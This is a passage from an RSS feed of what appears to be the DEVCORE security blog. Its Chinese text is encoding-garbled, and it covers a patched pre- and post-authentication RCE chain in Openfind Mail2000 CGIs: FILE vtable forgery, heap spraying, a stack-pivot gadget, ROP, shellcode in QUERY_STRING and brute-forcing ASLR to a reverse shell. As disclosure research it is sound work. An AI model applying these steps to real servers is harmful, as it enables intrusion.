    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_read_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_write_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_seek_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__seek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_close_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;å› æ­¤å¦‚æœæˆ‘å€‘å¯ä»¥ç¯¡æ”¹ã€å½é€ é€™å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtable&lt;/code&gt; çš„è©±ï¼Œå°±å¯ä»¥åœ¨ç¨‹å¼åšæª”æ¡ˆè™•ç†çš„æ™‚å€™ï¼ŒåŠ«æŒç¨‹å¼æµç¨‹ï¼æˆ‘å€‘å¯ä»¥ä»¥æ­¤è¨‚å‡ºä»¥ä¸‹çš„æ”»æ“Šæ­¥é©Ÿï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å»ºç«‹é€£ç·šï¼Œå‘¼å« CGI&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨å¤§é‡åƒæ•¸ï¼Œè¦†å¯« vector æŒ‡æ¨™&lt;/li&gt;
  &lt;li&gt;å½é€  POST file ç•¶ä¸­çš„ FILE*ï¼ŒæŒ‡å‘ä¸€å¡Šå½é€ çš„ FILE çµæ§‹&lt;/li&gt;
  &lt;li&gt;åœ¨ CGI æµç¨‹ä¸­å‘¼å« FILE ç›¸é—œçš„æ“ä½œ
    &lt;ul&gt;
      &lt;li&gt;fread, fwrite, fclose, â€¦&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŠ«æŒç¨‹å¼æµç¨‹&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æˆ‘å€‘ç¾åœ¨å·²ç¶“çŸ¥é“çµ‚é»æ˜¯&lt;strong&gt;å‘¼å«ä¸€å€‹ FILE æ“ä½œ&lt;/strong&gt;ï¼Œé‚£éº¼å°±å¯ä»¥é–‹å§‹å¾€å›æ‰¾&lt;strong&gt;å“ªå€‹ function&lt;/strong&gt; æ˜¯ CGI å¸¸ç”¨çš„ FILE æ“ä½œï¼Œåˆæœ‰&lt;strong&gt;å“ªä¸€äº› CGI&lt;/strong&gt; å¯ä»¥ä½œç‚ºå…¥å£é»ï¼Œæ‰èƒ½ä¸²å‡ºæˆ‘å€‘çš„æ”»æ“Šéˆï¼æˆ‘å€‘é¦–å…ˆå°ä½¿ç”¨åˆ° POST file çš„ç›¸é—œå‡½å¼åšç ”ç©¶ï¼Œä¸¦é¸å®šäº†ç›®æ¨™ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt;ã€‚
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; åœ¨è¨±å¤šç”¨åˆ° FILE çš„ CGI ä¸­æœ‰è¢«å‘¼å«ï¼Œå®ƒç”¨æ–¼åœ¨ç¨‹å¼çµæŸå‰å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;g_stCGIEnv&lt;/code&gt; æ¸…ç©ºï¼ŒåŒ…æ‹¬å°‡å‹•æ…‹é…ç½®çš„è¨˜æ†¶é«” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt; æ‰ï¼Œä»¥åŠå°‡æ‰€æœ‰ FILE é—œé–‰ï¼Œä¹Ÿå°±æ˜¯å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fclose()&lt;/code&gt;ï¼Œä¹Ÿæ„å‘³è‘—æ˜¯å¯ä»¥é€šé vtable è¢«åŠ«æŒçš„ï¼æˆ‘å€‘å¯ä»¥ä½¿ç”¨é€™å€‹è¶Šç•Œå¯«å…¥æ¼æ´è“‹æ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;ï¼Œè€ŒæŒ‡å‘çš„å…§å®¹å°±æ˜¯ HTTP request çš„åƒæ•¸ï¼Œä¾¿å¯ä»¥å½é€ ç‚º POST filesï¼åƒæ˜¯ä¸‹é¢é€™å€‹çµæ§‹ï¼š
&lt;img src=&quot;/assets/img/blog/20191223/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘çš„æœ€çµ‚ç›®æ¨™å°±æ˜¯å°‡ FILE* æŒ‡å‘å½é€ çš„çµæ§‹ï¼Œè—‰ç”±å½é€ çš„ vtable åŠ«æŒç¨‹å¼æµç¨‹ï¼é€™æ™‚å€™ä¾¿å‡ºç¾äº†ä¸€å€‹å•é¡Œï¼Œæˆ‘å€‘éœ€è¦å°‡ FILE* é€™å€‹æŒ‡æ¨™æŒ‡å‘ä¸€å€‹å…§å®¹å¯æ§çš„ä½ç½®ï¼Œä½†æ˜¯å…¶å¯¦æˆ‘å€‘ä¸¦ä¸çŸ¥é“è©²æŒ‡åˆ°å“ªè£¡å»ï¼Œæœƒæœ‰é€™å€‹å•é¡Œæ˜¯èµ·å› æ–¼ Linux ä¸Šçš„ä¸€å€‹é˜²ç¦¦æ©Ÿåˆ¶ - ASLRã€‚&lt;/p&gt;

&lt;h3 id=&quot;address-space-layout-randomization-aslr&quot;&gt;Address Space Layout Randomization (ASLR)&lt;/h3&gt;

&lt;p&gt;ASLR ä½¿å¾—æ¯æ¬¡ç¨‹å¼åœ¨åŸ·è¡Œä¸¦è¼‰å…¥è¨˜æ†¶é«”æ™‚ï¼Œæœƒéš¨æ©Ÿè¼‰å…¥è‡³ä¸åŒçš„è¨˜æ†¶é«”ä½ç½®ï¼Œæˆ‘å€‘å¯ä»¥å˜—è©¦ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /proc/self/maps&lt;/code&gt; è§€å¯Ÿæ¯ä¸€æ¬¡åŸ·è¡Œæ™‚çš„è¨˜æ†¶é«”ä½ç½®æ˜¯å¦ç›¸åŒï¼š
&lt;img src=&quot;/assets/img/blog/20191223/8.png&quot; alt=&quot;&quot; /&gt;
ASLR åœ¨å¤§éƒ¨åˆ†çš„ç’°å¢ƒä¸­éƒ½æ˜¯é è¨­é–‹å•Ÿçš„ï¼Œå› æ­¤åœ¨æ’°å¯« exploit æ™‚ï¼Œå¸¸é‡åˆ°å¯ä»¥å½é€ æŒ‡æ¨™ï¼Œå»ä¸çŸ¥é“è©²æŒ‡åˆ°å“ªè£¡çš„çª˜å¢ƒã€‚
è€Œé€™å€‹æ©Ÿåˆ¶åœ¨ CGI çš„æ¶æ§‹ä¸‹æœƒé€ æˆæ›´å¤§çš„é˜»ç¤™ï¼Œä¸€èˆ¬çš„ä¼ºæœå™¨çš„æ”»æ“Šæµç¨‹å¯èƒ½æ˜¯é€™æ¨£ï¼š
&lt;img src=&quot;/assets/img/blog/20191223/9.png&quot; alt=&quot;&quot; /&gt;
å¯ä»¥åœ¨ä¸€å€‹é€£ç·šç•¶ä¸­ leak address ä¸¦ç”¨ä¾†åšé€²ä¸€æ­¥çš„æ”»æ“Šï¼Œä½†åœ¨ CGI æ¶æ§‹ä¸­å»æ˜¯é€™æ¨£ï¼š
&lt;img src=&quot;/assets/img/blog/20191223/10.png&quot; alt=&quot;&quot; /&gt;
åœ¨é€™å€‹æƒ…æ³ä¸‹ï¼Œleak å¾—åˆ°çš„ address æ˜¯ç„¡æ³•åœ¨å¾ŒçºŒæ”»æ“Šä¸­ä½¿ç”¨çš„ï¼å› ç‚º CGI åŸ·è¡Œå®Œå°±çµæŸäº†ï¼Œä¸‹ä¸€å€‹ request åˆæ˜¯å…¨æ–°çš„ CGIï¼
ç‚ºäº†æ‡‰å°é€™å€‹å•é¡Œï¼Œæˆ‘å€‘æœ€å¾Œå¯«äº†å…©å€‹ exploitï¼Œæ”»æ“Šçš„æ‰‹æ³•æ ¹æ“š CGI binary è€Œæœ‰ä¸åŒã€‚&lt;/p&gt;

&lt;h3 id=&quot;post-auth-rce---cgi-binmsg_read&quot;&gt;Post-Auth RCE - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/msg_read&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;ç¬¬ä¸€å€‹ exploit çš„å…¥å£é»æ˜¯ä¸€å€‹éœ€è¦ç™»å…¥çš„é é¢ï¼Œé€™ä¸€éš»ç¨‹å¼è¼ƒå¤§ã€åŠŸèƒ½ä¹Ÿè¼ƒå¤šã€‚åœ¨é€™ä¸€å€‹ exploit ä¸­ï¼Œæˆ‘å€‘ä½¿ç”¨äº† heap spray çš„æ‰‹æ³•ä¾†å…‹æœ ASLRï¼Œä¹Ÿå°±æ˜¯åœ¨ heap ä¸­å¡«å…¥å¤§é‡é‡è¤‡çš„ç‰©ä»¶ï¼Œå¦‚æ­¤ä¸€ä¾†æˆ‘å€‘å°±æœ‰å¾ˆé«˜çš„æ©Ÿç‡å¯ä»¥&lt;strong&gt;çŒœ&lt;/strong&gt;åˆ°å®ƒçš„ä½ç½®ã€‚
&lt;img src=&quot;/assets/img/blog/20191223/11.png&quot; alt=&quot;&quot; /&gt;
è€Œ spray çš„å…§å®¹å°±æ˜¯å¤§é‡å½é€ å¥½çš„ FILE çµæ§‹ï¼ŒåŒ…å«å½é€ çš„ vtableã€‚å¾é€™éš» binary ä¸­ï¼Œæˆ‘å€‘æ‰¾åˆ°äº†ä¸€å€‹ååˆ†å¯¦ç”¨çš„ &lt;strong&gt;gadget&lt;/strong&gt;ï¼Œä¹Ÿå°±æ˜¯å°ç¨‹å¼ç‰‡æ®µï¼š&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xchg eax, esp; ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;é€™å€‹ gadget çš„ä½œç”¨åœ¨æ–¼ï¼Œæˆ‘å€‘å¯ä»¥&lt;strong&gt;æ”¹è®Š stack çš„ä½ç½®&lt;/strong&gt;ï¼Œè€Œå‰›å¥½æ­¤æ™‚çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; æŒ‡å‘å…§å®¹æ˜¯å¯æ§çš„ï¼Œå› æ­¤æ•´å€‹ stack çš„å…§å®¹éƒ½å¯ä»¥å½é€ ï¼Œä¹Ÿå°±æ˜¯èªªæˆ‘å€‘å¯ä»¥ä½¿ç”¨ ROP(Return-oriented programming) ä¾†åšåˆ©ç”¨ï¼æ–¼æ˜¯æˆ‘å€‘åœ¨å½é€ çš„ vtable ä¸­è¨­ç½®äº† stack æ¬ç§»çš„ gadget ä»¥åŠå¾ŒçºŒåˆ©ç”¨çš„ ROP æ”»æ“Šéˆï¼Œé€²è¡Œ ROP æ”»æ“Šï¼
&lt;img src=&quot;/assets/img/blog/20191223/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥åš ROPï¼Œä¹Ÿå°±å¯ä»¥æ‹¿ shell äº†å°å§ï¼ä½ ä»¥ç‚ºæ˜¯é€™æ¨£å—ï¼Ÿä¸ï¼Œå…¶å¯¦é‚„æœ‰ä¸€å€‹å¤§å•é¡Œï¼ŒåŒæ¨£å°å› æ–¼å‰é¢æåˆ°çš„é˜²ç¦¦æ©Ÿåˆ¶ ASLR â€“ æˆ‘å€‘æ²’æœ‰ system çš„ä½ç½®ï¼é€™éš» binary æœ¬èº«æä¾›çš„ gadget ä¸¦ä¸è¶³ä»¥é–‹å•Ÿä¸€å€‹ shellï¼Œå› æ­¤æˆ‘å€‘å¸Œæœ›å¯ä»¥ç›´æ¥åˆ©ç”¨ libc ç•¶ä¸­çš„ system ä¾†é”æˆç›®çš„ï¼Œä½†æ­£å¦‚å‰é¢æ‰€æåˆ°çš„ï¼Œè¨˜æ†¶é«”ä½ç½®æ¯æ¬¡è¼‰å…¥éƒ½æ˜¯éš¨æ©ŸåŒ–çš„ï¼Œæˆ‘å€‘ä¸¦ä¸çŸ¥é“ system çš„ç¢ºåˆ‡ä½ç½®ï¼
ç¶“éæˆ‘å€‘ä»”ç´°çš„è§€å¯Ÿé€™æ”¯ç¨‹å¼ä»¥å¾Œï¼Œæˆ‘å€‘ç™¼ç¾äº†ä¸€ä»¶éå¸¸ç‰¹åˆ¥çš„äº‹ï¼Œé€™éš»ç¨‹å¼ç†è«–ä¸Šæ˜¯æœ‰æ‰“é–‹ NXï¼Œä¹Ÿå°±æ˜¯å¯å¯«æ®µä¸å¯åŸ·è¡Œçš„ä¿è­·æ©Ÿåˆ¶
&lt;img src=&quot;/assets/img/blog/20191223/13.png&quot; alt=&quot;&quot; /&gt;
ä½†æ˜¯å¯¦éš›åŸ·è¡Œçš„æ™‚å€™ï¼Œstack çš„åŸ·è¡Œæ¬Šé™å»æœƒè¢«æ‰“é–‹ï¼
&lt;img src=&quot;/assets/img/blog/20191223/14.png&quot; alt=&quot;&quot; /&gt;
ä¸è«–åŸå› ç‚ºä½•ï¼Œé€™å€‹è¨­ç½®å°é§­å®¢ä¾†èªªæ˜¯éå¸¸æ–¹ä¾¿çš„ï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨é€™å€‹å¯åŸ·è¡Œæ®µï¼Œå°‡ shellcode æ”¾ä¸Šå»åŸ·è¡Œï¼Œå°±å¯ä»¥æˆåŠŸå¾—åˆ° shellï¼Œé”æˆ RCEï¼&lt;/p&gt;

&lt;p&gt;ç„¶è€Œï¼Œé€™å€‹æ”»æ“Šæ˜¯éœ€è¦ç™»å…¥çš„ï¼Œå°æ–¼è¿½æ±‚å®Œç¾çš„ DEVCORE ç ”ç©¶çµ„ä¾†èªªï¼Œä¸¦ä¸è¶³å¤ ï¼å› æ­¤æˆ‘å€‘æ›´é€²ä¸€æ­¥çš„ç ”ç©¶äº†å…¶å®ƒæ”»æ“Šè·¯å¾‘ï¼&lt;/p&gt;

&lt;h3 id=&quot;pre-auth-rce---cgi-bincgi_api&quot;&gt;Pre-Auth RCE - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;åœ¨æœç´¢äº†æ‰€æœ‰ CGI å…¥å£é»ä»¥å¾Œï¼Œæˆ‘å€‘æ‰¾åˆ°äº†ä¸€å€‹ä¸éœ€è¦ç™»å…¥ï¼ŒåŒæ™‚åˆæœƒå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear()&lt;/code&gt; çš„ CGI â€“ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/cgi_api&lt;/code&gt;ã€‚ä¸€å¦‚å…¶åï¼Œå®ƒå°±æ˜¯ä¸€éš»å‘¼å« API çš„æ¥å£ï¼Œå› æ­¤ç¨‹å¼æœ¬èº«éå¸¸çš„å°ï¼Œå¹¾ä¹æ˜¯å‘¼å«å®Œ library å°±çµæŸäº†ï¼Œä¹Ÿå› æ­¤ä¸å†æœ‰ stack pivot çš„ gadget å¯ä»¥åˆ©ç”¨ã€‚
é€™æ™‚ï¼Œç”±æ–¼æˆ‘å€‘å·²ç¶“å¾—çŸ¥ stack æ˜¯å¯åŸ·è¡Œçš„ï¼Œå› æ­¤å…¶å¯¦æˆ‘å€‘æ˜¯å¯ä»¥è·³é ROP é€™å€‹æ­¥é©Ÿï¼Œç›´æ¥å°‡ shellcode æ”¾ç½®åœ¨ stack ä¸Šçš„ï¼Œé€™è£¡åˆ©ç”¨åˆ°ä¸€å€‹ CGI çš„ç‰¹æ€§ â€“ HTTP çš„ç›¸é—œè®Šæ•¸æœƒæ”¾åœ¨ç’°å¢ƒè®Šæ•¸ä¸­ï¼Œåƒæ˜¯ä¸‹åˆ—é€™äº›å¸¸è¦‹è®Šæ•¸ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;HTTP_HOST&lt;/li&gt;
  &lt;li&gt;REQUEST_METHOD&lt;/li&gt;
  &lt;li&gt;QUERY_STRING&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è€Œç’°å¢ƒè®Šæ•¸äº‹å¯¦ä¸Šå°±æ˜¯è¢«æ”¾ç½®åœ¨ stack çš„æœ€æœ«ç«¯ï¼Œä¹Ÿå°±æ˜¯å¯åŸ·è¡Œæ®µçš„ä½ç½®ï¼Œå› æ­¤æˆ‘å€‘åªè¦å½é€  vtable ç›´æ¥å‘¼å« shellcode å°±å¯ä»¥äº†ï¼
&lt;img src=&quot;/assets/img/blog/20191223/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶é€™æ™‚å€™åŒæ¨£å‡ºç¾äº†ä¸€å€‹å•é¡Œï¼šæˆ‘å€‘ä»èˆŠæ²’æœ‰ stack çš„è¨˜æ†¶é«”ä½ç½®ã€‚é€™å€‹æ™‚å€™æœ‰äº›äººå¯èƒ½æœƒé™·å…¥ä¸€å€‹è¿·æ€ï¼Œè¦ºå¾—æ”»æ“Šå°±æ˜¯è¦ä¸€æ¬¡åˆ°ä½ï¼Œåƒå€‹ç‹™æ“Šæ‰‹ä¸€æ¨£ä¸€æ“Šå¿…æ®ºï¼Œä½†å¯¦éš›ä¸Šå¯èƒ½æ˜¯é€™æ¨£æ‹¿æ©Ÿé—œæ§æŠŠæ•µäººç‚¸é£›ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191223/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ›å€‹è§’åº¦æ€è€ƒï¼Œé€™éš» binary æ˜¯ 32 bits çš„ï¼Œå› æ­¤é€™å€‹ä½ç½®æœ‰ 1.5bytes æ˜¯éš¨æ©Ÿçš„ï¼Œç¸½å…±æœ‰ 16&lt;sup&gt;3&lt;/sup&gt; å€‹å¯èƒ½çš„çµ„åˆï¼Œæ‰€ä»¥å…¶å¯¦å¹³å‡åªè¦ 4096 æ¬¡è«‹æ±‚å°±å¯ä»¥æ’åˆ°ä¸€æ¬¡ï¼é€™å°æ–¼ç¾åœ¨çš„é›»è…¦ã€ç¶²è·¯é€Ÿåº¦ä¾†èªªå…¶å¯¦ä¹Ÿå°±æ˜¯å¹¾åˆ†é˜ä¹‹é–“çš„äº‹æƒ…ï¼Œå› æ­¤ç›´æ¥åšæš´åŠ›ç ´è§£ä¹Ÿæ˜¯å¯è¡Œçš„ï¼æ–¼æ˜¯æˆ‘å€‘æœ€çµ‚çš„ exploit æµç¨‹å°±æ˜¯ï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;ç™¼é€ POST è«‹æ±‚è‡³ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;QUERY_STRING ä¸­æ”¾å…¥ shellcode&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;è§¸ç™¼è¶Šç•Œå¯«å…¥ï¼Œè¦†è“‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;åœ¨è¶Šç•Œçš„åƒæ•¸æº–å‚™å½é€ çš„ FILE &amp;amp; vtable&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cgi_api&lt;/code&gt; çµæŸå‰å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MCGI_VarClear&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;è·³è‡³ vtable ä¸Šçš„ shellcode ä½ç½®ï¼Œå»ºç«‹ reverse shell&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æœ€å¾Œæˆ‘å€‘æˆåŠŸå¯«å‡ºäº†ä¸ç”¨èªè­‰çš„ RCE æ”»æ“Šéˆï¼Œä¸¦ä¸”é€™å€‹ exploit æ˜¯ä¸æœƒå› ç‚º binary çš„ç‰ˆæœ¬ä¸åŒè€Œå—å½±éŸ¿çš„ï¼è€Œåœ¨å¯¦éš›é‡åˆ°çš„æ¡ˆä¾‹ä¸­ä¹Ÿè­‰æ˜äº†é€™å€‹ exploit çš„å¯è¡Œæ€§ï¼Œæˆ‘å€‘æ›¾åœ¨ä¸€æ¬¡çš„æ¼”ç·´ç•¶ä¸­ï¼Œè—‰ç”± Mail2000 çš„é€™å€‹ 1day ä½œç‚ºçªç ´å£ï¼ŒæˆåŠŸæ´©æ¼ç›®æ¨™çš„ VPN è³‡æ–™ï¼Œé€²ä¸€æ­¥å¾€å…§ç¶²æ»²é€ï¼&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´ä¿®å¾©&quot;&gt;æ¼æ´ä¿®å¾©&lt;/h2&gt;

&lt;p&gt;æ­¤æ¼æ´å·²åœ¨ 2018/05/08 ç™¼å¸ƒçš„ Mail2000 V7 Patch 050 ç‰ˆæœ¬ä¸­å®Œæˆä¿®å¾©ã€‚Patch ç·¨è™Ÿç‚º OF-ISAC-18-002ã€OF-ISAC-18-003ã€‚&lt;/p&gt;

&lt;h2 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h2&gt;

&lt;p&gt;æœ€å¾Œæƒ³ä¾†è«‡è«‡å°æ–¼é€™äº›æ¼æ´ï¼Œå» å•†è©²ç”¨ä»€éº¼æ¨£çš„å¿ƒæ…‹å»é¢å°ã€‚ä½œç‚ºä¸€å€‹æä¾›ç”¢å“çš„å» å•†ï¼ŒOpenfind åœ¨é€™ä¸€æ¬¡çš„æ¼æ´è™•ç†ä¸­æœ‰å¹¾å€‹é—œéµå€¼å¾—å­¸ç¿’ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å¿ƒæ…‹é–‹æ”¾
    &lt;ul&gt;
      &lt;li&gt;ä¸»å‹•æä¾›æ¸¬è©¦ç’°å¢ƒ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç©æ¥µä¿®å¾©æ¼æ´
    &lt;ul&gt;
      &lt;li&gt;é¢å°æ¼æ´ä»¥ç©æ¥µæ­£å‘çš„æ…‹åº¦ï¼Œè¿…é€Ÿè™•ç†&lt;/li&gt;
      &lt;li&gt;ä¿®å¾©å®Œç•¢å¾Œï¼Œèˆ‡æå ±è€…åˆä½œé©—è­‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é‡è¦–å®¢æˆ¶å®‰å…¨
    &lt;ul&gt;
      &lt;li&gt;ç™¼å¸ƒé‡å¤§æ›´æ–°ä¸¦ä¸»å‹•é€šå ±å®¢æˆ¶ã€å”åŠ©æ›´æ–°&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…¶å¯¦ç”¢å“æœ‰æ¼æ´æ˜¯å¾ˆæ­£å¸¸ä¹Ÿå¾ˆé›£é¿å…çš„äº‹ï¼Œè€Œæˆ‘å€‘ç ”ç©¶çµ„æ˜¯ä½œç‚ºä¸€å€‹å”åŠ©è€…çš„è§’è‰²ï¼ŒæœŸæœ›èƒ½è—‰ç”±å›å ±æ¼æ´å¹«åŠ©ä¼æ¥­ï¼Œæé«˜è³‡å®‰æ„è­˜ä¸¦å¢é€²å°ç£çš„è³‡å®‰æ°´å¹³ï¼å¸Œæœ›å» å•†å€‘ä¹Ÿèƒ½ä»¥æ­£å‘çš„æ…‹åº¦ä¾†é¢å°æ¼æ´ï¼Œè€Œä¸æ˜¯é–ƒèº²é€ƒé¿ï¼Œé€™æ¨£åªæœƒä»¤ç”¨æˆ¶å€‘é™·å…¥æ›´å¤§çš„è³‡å®‰é¢¨éšªç•¶ä¸­ï¼&lt;/p&gt;

&lt;p&gt;è€Œå°æ–¼ä½¿ç”¨å„é …è¨­å‚™çš„ç”¨æˆ¶ï¼Œä¹Ÿæ‡‰ç•¶æŒæ¡å¥½å±¬æ–¼è‡ªå·±çš„è³‡ç”¢ï¼Œé˜²ç«ç‰†ã€ä¼ºæœå™¨ç­‰ç”¢å“ä¸¦ä¸æ˜¯è³¼è²·ä¾†æ¶è¨­å¥½ä»¥å¾Œå°±æ²’æœ‰å•é¡Œäº†ï¼Œåšå¥½è³‡ç”¢ç›¤é»ã€è¿½è¹¤å» å•†çš„å®‰å…¨æ€§æ›´æ–°ï¼Œæ‰èƒ½ç¢ºä¿ç”¢å“ä¸å—åˆ° 1day çš„æ”»æ“Šï¼è€Œå®šæœŸé€²è¡Œæ»²é€æ¸¬è©¦ä»¥åŠç´…éšŠæ¼”ç·´ï¼Œæ›´æ˜¯å¯ä»¥å¹«åŠ©ä¼æ¥­é‡æ¸…è‡ªå·±æ˜¯å¦æœ‰ç›²é»ã€ç¼ºå¤±ï¼Œé€²è€Œæ”¹å–„ä»¥é™ä½ä¼æ¥­è³‡å®‰é¢¨éšªã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world/</link>
                <guid>https://devco.re/blog/2019/12/23/how-binary-dog-survives-in-web-world</guid>
                <pubDate>Mon, 23 Dec 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä½ ç”¨å®ƒä¸Šç¶²ï¼Œæˆ‘ç”¨å®ƒé€²ä½ å…§ç¶²! ä¸­è¯é›»ä¿¡æ•¸æ“šæ©Ÿé ç«¯ä»£ç¢¼åŸ·è¡Œæ¼æ´</title>
                <description>&lt;p&gt;å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ Orange! é€™æ¬¡çš„æ–‡ç« ï¼Œæ˜¯æˆ‘åœ¨ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt; ä¸Šæ‰€åˆ†äº«çš„è­°é¡Œï¼Œè¬›è¿°å¦‚ä½•å¾ä¸­è¯é›»ä¿¡çš„ä¸€å€‹è¨­å®šç–å¤±ï¼Œåˆ°ä¸²å‡ºå¯ä»¥æŒæ§æ•¸åè¬ã€ç”šè‡³æ•¸ç™¾è¬å°çš„å®¶ç”¨æ•¸æ“šæ©Ÿæ¼æ´!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;èº«ç‚º DEVCORE çš„ç ”ç©¶åœ˜éšŠï¼Œæˆ‘å€‘çš„å·¥ä½œå°±æ˜¯ç ”ç©¶æœ€æ–°çš„æ”»æ“Šè¶¨å‹¢ã€æŒ–æ˜æœ€æ–°çš„å¼±é»ã€æ‰¾å‡ºå¯ä»¥å½±éŸ¿æ•´å€‹ä¸–ç•Œçš„æ¼æ´ï¼Œå›å ±çµ¦å» å•†é¿å…é€™äº›æ¼æ´æµè‡³åœ°ä¸‹é»‘å¸‚è¢«é»‘å¸½é§­å®¢ç”šè‡³åœ‹å®¶ç´šé§­å®¢çµ„ç¹”åˆ©ç”¨ï¼Œè®“é€™å€‹ä¸–ç•Œè®Šå¾—æ›´åŠ å®‰å…¨!&lt;/p&gt;

